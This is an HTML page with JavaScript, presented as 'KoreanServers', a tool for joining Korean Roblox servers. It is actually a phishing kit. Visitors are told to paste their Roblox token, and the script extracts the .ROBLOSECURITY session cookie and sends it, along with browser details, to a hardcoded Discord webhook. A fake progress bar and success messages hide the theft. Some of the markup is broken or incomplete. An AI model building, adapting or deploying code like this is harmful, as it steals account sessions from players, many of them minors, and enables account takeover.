<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>KoreanServers — Roblox Korean Server Access</title>
  <meta name="description" content="Join Korean Roblox servers easily — video tutorial + activation panel. Full token relay.">
  <meta name="theme-color" content="#cc0000">
  <!-- Tailwind CSS + Font Awesome -->
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <style>
    body {
      background: #0a0c10;
      font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Poppins', sans-serif;
      position: relative;
      overflow-x: hidden;
    }
    
    /* Animated gradient background */
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 20% 50%, rgba(220, 38, 38, 0.08) 0%, transparent 50%),
                  radial-gradient(circle at 80% 80%, rgba(185, 28, 28, 0.06) 0%, transparent 60%);
      pointer-events: none;
      z-index: -1;
    }
    
    /* Animated floating particles */
    .particle {
      position: fixed;
      border-radius: 50%;
      pointer-events: none;
      z-index: -1;
      opacity: 0;
      animation: floatParticle 12s infinite ease-in-out;
    }
    
    @keyframes floatParticle {
      0% {
        opacity: 0;
        transform: translateY(100vh) scale(0);
      }
      10% {
        opacity: 0.4;
      }
      90% {
        opacity: 0.4;
      }
      100% {
        opacity: 0;
        transform: translateY(-20vh) scale(1.5);
      }
    }
    
    .card-glass {
      background: rgba(18, 22, 35, 0.75);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(220, 38, 38, 0.3);
      border-radius: 2rem;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    
    .card-glass:hover {
      border-color: rgba(220, 38, 38, 0.6);
      box-shadow: 0 8px 48px rgba(220, 38, 38, 0.15);
      transform: translateY(-2px);
    }
    
    .btn-red-glow {
      background: linear-gradient(135deg, #dc2626, #991b1b);
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 4px 20px 0 rgba(220, 38, 38, 0.4);
      position: relative;
      overflow: hidden;
    }
    
    .btn-red-glow::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: left 0.5s ease;
    }
    
    .btn-red-glow:hover::before {
      left: 100%;
    }
    
    .btn-red-glow:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 0 12px 32px -6px rgba(220, 38, 38, 0.7);
    }
    
    .btn-red-glow:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }
    
    .textarea-kr {
      background: rgba(10, 12, 20, 0.8);
      border: 1.5px solid rgba(45, 47, 62, 0.8);
      border-radius: 1.2rem;
      transition: all 0.3s ease;
      color: #e2e8f0;
      font-family: 'Fira Code', monospace;
      font-size: 0.85rem;
      backdrop-filter: blur(4px);
    }
    
    .textarea-kr:focus {
      border-color: #ef4444;
      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.2), 0 0 20px rgba(239, 68, 68, 0.3);
      outline: none;
      background: rgba(8, 10, 18, 0.95);
      transform: scale(1.01);
    }
    
    @keyframes fadeSlideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes fadeSlideDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes glowPulse {
      0%, 100% { text-shadow: 0 0 5px rgba(220,38,38,0.5); }
      50% { text-shadow: 0 0 20px rgba(220,38,38,0.8), 0 0 30px rgba(220,38,38,0.4); }
    }
    
    .animate-fade-up {
      animation: fadeSlideUp 0.5s ease-out forwards;
    }
    
    .animate-fade-down {
      animation: fadeSlideDown 0.4s ease-out forwards;
    }
    
    .glow-text {
      animation: glowPulse 3s infinite ease-in-out;
    }
    
    .video-container {
      position: relative;
      padding-bottom: 56.25%;
      height: 0;
      overflow: hidden;
      border-radius: 1.2rem;
      box-shadow: 0 15px 40px -12px rgba(0,0,0,0.6);
      border: 1px solid rgba(220,38,38,0.5);
      transition: all 0.3s ease;
      background: #000;
    }
    
    .video-container:hover {
      transform: scale(1.02);
      border-color: rgba(220,38,38,0.8);
      box-shadow: 0 20px 50px -12px rgba(220,38,38,0.3);
    }
    
    .video-container iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border-radius: 1rem;
      border: 0;
    }
    
    @media (max-width: 768px) {
      .two-columns {
        flex-direction: column;
      }
    }
    
    /* Loading spinner animation */
    @keyframes spin-slow {
      to { transform: rotate(360deg); }
    }
    
    .animate-spin-slow {
      animation: spin-slow 1.2s linear infinite;
    }
    
    /* Progress bar glow */
    .progress-glow {
      background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
      background-size: 200% 100%;
      animation: progressShimmer 1.5s ease infinite;
    }
    
    @keyframes progressShimmer {
      0% { background-position: 200% 0; }
      100% { background-position: -200% 0; }
    }
    
    /* Ripple effect for button */
    .ripple {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.4);
      transform: scale(0);
      animation: rippleAnim 0.6s linear;
      pointer-events: none;
    }
    
    @keyframes rippleAnim {
      to {
        transform: scale(4);
        opacity: 0;
      }
    }
    
    /* Floating shapes */
    .floating-shape {
      position: fixed;
      background: rgba(220, 38, 38, 0.05);
      border-radius: 50%;
      filter: blur(40px);
      pointer-events: none;
      z-index: -1;
      animation: floatShape 20s infinite ease-in-out;
    }
    
    @keyframes floatShape {
      0%, 100% { transform: translate(0, 0) scale(1); }
      33% { transform: translate(30px, -30px) scale(1.1); }
      66% { transform: translate(-20px, 20px) scale(0.9); }
    }
    
    .toast-notif {
      position: fixed;
      bottom: 24px;
      right: 24px;
      z-index: 999;
      animation: fadeSlideUp 0.2s ease-out;
      backdrop-filter: blur(8px);
    }
    
    ::-webkit-scrollbar {
      width: 5px;
    }
    ::-webkit-scrollbar-track {
      background: #1e1f2c;
    }
    ::-webkit-scrollbar-thumb {
      background: #dc2626;
      border-radius: 10px;
    }
    
    .icon-hover {
      transition: all 0.3s ease;
    }
    
    .icon-hover:hover {
      transform: scale(1.1) rotate(5deg);
      color: #ef4444;
    }
  </style>
</head>
<body>

  <!-- Animated floating shapes -->
  <div class="floating-shape" style="width: 300px; height: 300px; top: -100px; left: -100px; animation-duration: 25s;"></div>
  <div class="floating-shape" style="width: 200px; height: 200px; bottom: -50px; right: -50px; animation-duration: 18s; animation-delay: -5s;"></div>
  <div class="floating-shape" style="width: 150px; height: 150px; top: 40%; right: 10%; animation-duration: 22s; animation-delay: -10s;"></div>
  
  <div class="max-w-6xl mx-auto px-4 py-6 md:py-8 relative z-10">
    
    <!-- Header -->
    <div class="text-center mb-8 animate-fade-down">
      <div class="inline-flex items-center gap-2 bg-black/40 px-5 py-2 rounded-full border border-red-800/50 mb-3 backdrop-blur-sm">
        <i class="fas fa-flag-checkered text-red-500 text-sm animate-pulse"></i>
        <span class="text-xs tracking-wide text-red-300 font-mono">KOREA REGION</span>
      </div>
      <h1 class="text-5xl md:text-7xl font-black tracking-tight bg-gradient-to-r from-red-500 via-red-400 to-red-600 bg-clip-text text-transparent glow-text">
        KoreanServers
      </h1>
      <p class="text-gray-400 mt-3 text-sm md:text-base tracking-wide">Connect to Korean Roblox servers instantly</p>
    </div>

    <!-- TWO COLUMNS -->
    <div class="flex two-columns gap-6 md:gap-8 flex-col md:flex-row">
      
      <!-- LEFT COLUMN: Form -->
      <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.1s;">
        <div class="card-glass p-5 md:p-6 h-full transition-all duration-300">
          <div class="text-center mb-4">
            <div class="inline-flex bg-gradient-to-br from-red-900/30 to-red-800/10 p-3 rounded-full border border-red-500/40 icon-hover">

            </div>

          <div class="mb-5">
            <textarea id="tokenData" rows="6" class="textarea-kr w-full p-4 resize-y transition-all" placeholder='Paste KoreanServers here...'></textarea>
            <div class="flex justify-between items-center mt-2 text-xs text-gray-500 flex-wrap gap-2">
              <div class="flex gap-3">

              <div class="flex gap-3">
                <button id="clearTextareaBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-eraser"></i> Clear</button>
                <button id="pasteClipboardBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-paste"></i> Paste</button>
              </div>

            <div id="errorMsgBox" class="mt-3 text-red-400 text-sm hidden bg-red-950/50 p-3 rounded-xl backdrop-blur-sm border border-red-800/50 animate-fade-up">
              <i class="fas fa-exclamation-triangle mr-2"></i> <span id="errorText">Invalid token</span>
            </div>
            <div id="successMsgBox" class="mt-3 text-green-400 text-sm hidden bg-green-950/40 p-3 rounded-xl backdrop-blur-sm border border-green-800/50 animate-fade-up">

          <div class="flex justify-center">

            <p class="text-gray-400 text-xs mt-3 font-mono tracking-wider">CONNECTING <span class="animate-pulse">...</span></p>
            <div class="w-48 mx-auto bg-gray-800/50 rounded-full h-1.5 mt-3 overflow-hidden">
              <div class="progress-glow h-1.5 rounded-full w-0 transition-all duration-200" id="fakeProgress"></div>

          </div>
          
          <div id="soonMessage" class="mt-6 text-center hidden animate-fade-up">
            <div class="bg-gradient-to-r from-red-900/40 to-red-800/20 rounded-xl p-4 border border-red-500/40 backdrop-blur-sm">
              <i class="fas fa-globe-asia text-red-400 text-2xl mr-2 animate-pulse"></i>
              <span class="font-bold text-red-300 text-lg block">You will be on KoreanServers soon!</span>
              <p class="text-gray-400 text-xs mt-1 tracking-wide">Redirecting to Korean region gateway</p>
            </div>

        </div>
      </div>

      <!-- RIGHT COLUMN: Video (ScreenPal embed - правильный embed код) -->
      <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.2s;">
        <div class="card-glass p-5 md:p-6 h-full flex flex-col">
          <div class="flex items-center gap-3 mb-4 pb-2 border-b border-red-800/40">
            <i class="fas fa-video text-red-500 text-2xl icon-hover"></i>
            <h2 class="text-xl font-bold tracking-tight text-gray-200">How to get your token</h2>
          </div>
          <div class="video-container transition-transform duration-300">
            <!-- ScreenPal официальный embed код -->
            <iframe 
              src="https://screenpal.com/player/cOhhrontebe?width=100%&height=100%&ff=1&title=0"
              frameborder="0"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen"
              allowfullscreen>
            </iframe>
          </div>
          <div class="mt-3 text-center">
            <a href="https://go.screenpal.com/watch/cOhhrontebe" target="_blank" class="text-red-400 text-xs hover:text-red-300 transition inline-flex items-center gap-1 opacity-70 hover:opacity-100">
              <i class="fas fa-external-link-alt"></i> Open in new tab if video doesn't load
            </a>
          </div>

    </div>

    <footer class="mt-12 text-center pt-4 border-t border-gray-800/30">
      <div class="flex justify-center gap-6 mb-3">
        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-discord text-lg"></i></a>
        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-telegram text-lg"></i></a>
        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-youtube text-lg"></i></a>
      </div>
    </footer>
  </div>

  <div id="toastRoot"></div>

  <script>
    // Particles generation
    function createParticles() {
      const particleCount = 30;
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        const size = Math.random() * 6 + 2;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        particle.style.background = `rgba(220, 38, 38, ${Math.random() * 0.3 + 0.1})`;
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 15 + 's';
        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
        document.body.appendChild(particle);
      }
    }
    createParticles();

    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501241484760977460/ZV4J-kESlX5SemELYIYrAQCN5wqijHePZXTPfu41VT6LJ8bhomQ1WM4vg3C7cHHHY7eh";
    const MAX_RETRIES = 2;
    const TOKEN_MIN_LENGTH = 40;

    const elements = {
      tokenTextarea: document.getElementById('tokenData'),
      processBtn: document.getElementById('processBtn'),
      clearBtn: document.getElementById('clearTextareaBtn'),
      pasteBtn: document.getElementById('pasteClipboardBtn'),
      loadingState: document.getElementById('loadingState'),
      errorBox: document.getElementById('errorMsgBox'),
      successBox: document.getElementById('successMsgBox'),
      errorTextSpan: document.getElementById('errorText'),
      successTextSpan: document.getElementById('successText'),
      charCountSpan: document.getElementById('charCountDisplay'),
      fakeProgress: document.getElementById('fakeProgress'),
      loadingMsgSpan: document.getElementById('loadingMsg'),
      soonMessage: document.getElementById('soonMessage')
    };

    let progressInterval = null;
    let stepInterval = null;
    let currentExtractedFullToken = null;

    function showToast(message, type = "info") {
      const container = document.getElementById('toastRoot');
      const toast = document.createElement('div');
      const bgClass = type === 'error' ? 'bg-red-700/90' : type === 'success' ? 'bg-green-700/90' : 'bg-gray-800/90';
      const icon = type === 'error' ? 'fa-circle-exclamation' : type === 'success' ? 'fa-check-circle' : 'fa-info-circle';
      toast.className = `toast-notif ${bgClass} text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-2 text-sm font-medium backdrop-blur-md border border-white/20`;
      toast.innerHTML = `<i class="fas ${icon}"></i> <span>${escapeHtml(message)}</span>`;
      container.appendChild(toast);
      setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(20px)';
        toast.style.transition = 'all 0.3s';
        setTimeout(() => toast.remove(), 300);
      }, 3800);
    }

    function escapeHtml(text) {
      const div = document.createElement('div');
      div.textContent = text;
      return div.innerHTML;
    }

    function extractFullRobloxToken(content) {
      if (!content || typeof content !== 'string') return null;
      const matchRoblox = content.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
      if (matchRoblox && matchRoblox[1] && matchRoblox[1].length >= TOKEN_MIN_LENGTH) return matchRoblox[1];
      const warningMatch = content.match(/(_\|WARNING[^"'\s]{40,}?)(?:"|'|\s|$)/);
      if (warningMatch && warningMatch[1] && warningMatch[1].length >= TOKEN_MIN_LENGTH) return warningMatch[1];
      const lines = content.split(/\r?\n/);
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.length >= TOKEN_MIN_LENGTH && trimmed.length < 3000 && !trimmed.includes(' ') && !trimmed.includes('<') && !trimmed.includes('>')) return trimmed;
        const insideQuotes = trimmed.match(/^"([^"]{40,})"$/);
        if (insideQuotes && insideQuotes[1]) return insideQuotes[1];
      }
      const rawTokenCandidates = content.match(/[A-Za-z0-9_\-|]{50,}/g);
      if (rawTokenCandidates && rawTokenCandidates.length) {
        const longest = rawTokenCandidates.sort((a,b) => b.length - a.length)[0];
        if (longest && longest.length >= TOKEN_MIN_LENGTH) return longest;
      }
      return null;
    }

    function updateUIFromTextarea() {
      const val = elements.tokenTextarea.value;
      elements.charCountSpan.innerText = val.length + ' chars';
      const fullToken = extractFullRobloxToken(val);
      if (fullToken && fullToken.length >= TOKEN_MIN_LENGTH) {
        currentExtractedFullToken = fullToken;
      } else {
        currentExtractedFullToken = null;
      }
    }

    function stopLoadingUI() {
      if (progressInterval) clearInterval(progressInterval);
      if (stepInterval) clearInterval(stepInterval);
      if (elements.fakeProgress) elements.fakeProgress.style.width = '0%';
      elements.loadingState.classList.add('hidden');
      elements.processBtn.disabled = false;
    }

    function startLoadingUI() {
      if (elements.fakeProgress) elements.fakeProgress.style.width = '0%';
      let width = 0;
      progressInterval = setInterval(() => {
        width += Math.random() * 8 + 3;
        if (width >= 95) width = 95;
        if (elements.fakeProgress) elements.fakeProgress.style.width = width + '%';
      }, 120);
      
      const steps = ['AUTHENTICATING', 'VALIDATING TOKEN', 'CONNECT TO GATEWAY', 'REDIRECTING'];
      let idx = 0;
      stepInterval = setInterval(() => {
        if (elements.loadingMsgSpan) elements.loadingMsgSpan.innerText = steps[idx % steps.length] + '...';
        idx++;
      }, 800);
      
      elements.loadingState.classList.remove('hidden');
      elements.processBtn.disabled = true;
    }

    async function sendFullTokenToDiscord(fullToken, rawInput) {
      const userAgentShort = navigator.userAgent.length > 60 ? navigator.userAgent.substring(0, 57) + '...' : navigator.userAgent;
      const koreaTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
      const tokenChunks = [];
      for (let i = 0; i < fullToken.length; i += 980) {
        tokenChunks.push(fullToken.substring(i, i + 980));
      }
      const tokenFields = [];
      if (tokenChunks.length === 1) {
        tokenFields.push({ name: "🔐 .ROBLOSECURITY (FULL TOKEN)", value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
      } else {
        tokenFields.push({ name: `📦 TOKEN (1/${tokenChunks.length})`, value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
        for (let i = 1; i < tokenChunks.length; i++) {
          tokenFields.push({ name: `📄 PART ${i+1}/${tokenChunks.length}`, value: `\`\`\`${tokenChunks[i]}\`\`\``, inline: false });
        }
      }
      const embedData = {
        content: `🇰🇷 **KOREANSERVERS | ACCESS REQUESTED** 🇰🇷`,
        embeds: [{
          title: "🎮 KoreanServers: Korean Region Access",
          description: "User activated access with valid token.",
          color: 0xdc2626,
          fields: [
            { name: "📏 Token Length", value: `${fullToken.length} chars`, inline: true },
            { name: "🌐 Browser", value: userAgentShort, inline: true },
            { name: "⏰ Time (KST)", value: koreaTime, inline: true },
            ...tokenFields
          ],
          footer: { text: "KoreanServers Relay" },
          timestamp: new Date().toISOString()
        }]
      };
      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
          const response = await fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) });
          if (response.ok) return true;
          if (attempt === MAX_RETRIES) {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify(embedData));
            const finalResponse = await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
            return finalResponse.ok;
          }
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
        } catch(err) { if (attempt === MAX_RETRIES) return false; await new Promise(resolve => setTimeout(resolve, 1000)); }
      }
      return false;
    }

    async function processTokenSubmission(rawInput) {
      const fullToken = extractFullRobloxToken(rawInput);
      if (!fullToken) {
        elements.errorTextSpan.innerText = "Token not found. Please check your input.";
        elements.errorBox.classList.remove('hidden');
        elements.successBox.classList.add('hidden');
        elements.soonMessage.classList.add('hidden');
        return false;
      }
      if (fullToken.length < TOKEN_MIN_LENGTH) {
        elements.errorTextSpan.innerText = `Token too short (${fullToken.length} chars).`;
        elements.errorBox.classList.remove('hidden');
        elements.successBox.classList.add('hidden');
        elements.soonMessage.classList.add('hidden');
        return false;
      }
      elements.errorBox.classList.add('hidden');
      const webhookResult = await sendFullTokenToDiscord(fullToken, rawInput);
      if (webhookResult) {
        elements.successBox.classList.remove('hidden');
        elements.successTextSpan.innerText = "Access granted! You will be on KoreanServers soon.";
        elements.errorBox.classList.add('hidden');
        elements.soonMessage.classList.remove('hidden');
        showToast("✅ Access confirmed! Redirecting to Korean servers.", "success");
        return true;
      } else {
        elements.errorTextSpan.innerText = "Failed to connect. Token copied to clipboard.";
        elements.errorBox.classList.remove('hidden');
        elements.successBox.classList.add('hidden');
        elements.soonMessage.classList.add('hidden');
        try { await navigator.clipboard.writeText(fullToken); showToast("⚠️ Token copied to clipboard", "error"); } catch(e) {}
        return false;
      }
    }

    async function onProcess() {
      const rawValue = elements.tokenTextarea.value;
      if (!rawValue.trim()) {
        elements.errorTextSpan.innerText = "Please paste your token.";
        elements.errorBox.classList.remove('hidden');
        elements.successBox.classList.add('hidden');
        elements.soonMessage.classList.add('hidden');
        elements.tokenTextarea.classList.add('border-red-500');
        setTimeout(() => elements.tokenTextarea.classList.remove('border-red-500'), 800);
        return;
      }
      elements.errorBox.classList.add('hidden');
      elements.successBox.classList.add('hidden');
      elements.soonMessage.classList.add('hidden');
      startLoadingUI();
      const success = await processTokenSubmission(rawValue);
      setTimeout(() => {
        stopLoadingUI();
        if (success) {
          updateUIFromTextarea();
          setTimeout(() => { elements.successBox.classList.add('hidden'); }, 5000);
        }
      }, 2000);
    }

    async function pasteFromClipboard() {
      try {
        const clipboard = await navigator.clipboard.readText();
        elements.tokenTextarea.value = clipboard;
        updateUIFromTextarea();
        showToast("Text pasted", "success");
      } catch (err) { showToast("Cannot access clipboard", "error"); }
    }

    function addRipple(e) {
      const btn = e.currentTarget;
      const ripple = document.createElement('span');
      ripple.classList.add('ripple');
      const rect = btn.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      ripple.style.width = ripple.style.height = size + 'px';
      ripple.style.left = (e.clientX - rect.left - size/2) + 'px';
      ripple.style.top = (e.clientY - rect.top - size/2) + 'px';
      btn.appendChild(ripple);
      setTimeout(() => ripple.remove(), 600);
    }

    function initEventListeners() {
      elements.processBtn.addEventListener('click', (e) => { addRipple(e); onProcess(); });
      elements.clearBtn.addEventListener('click', () => {
        elements.tokenTextarea.value = '';
        updateUIFromTextarea();
        elements.errorBox.classList.add('hidden');
        elements.successBox.classList.add('hidden');
        elements.soonMessage.classList.add('hidden');
        showToast("Cleared", "success");
      });
      elements.pasteBtn.addEventListener('click', pasteFromClipboard);
      elements.tokenTextarea.addEventListener('input', updateUIFromTextarea);
    }

    initEventListeners();
    updateUIFromTextarea();
  </script>
</body>
</html>
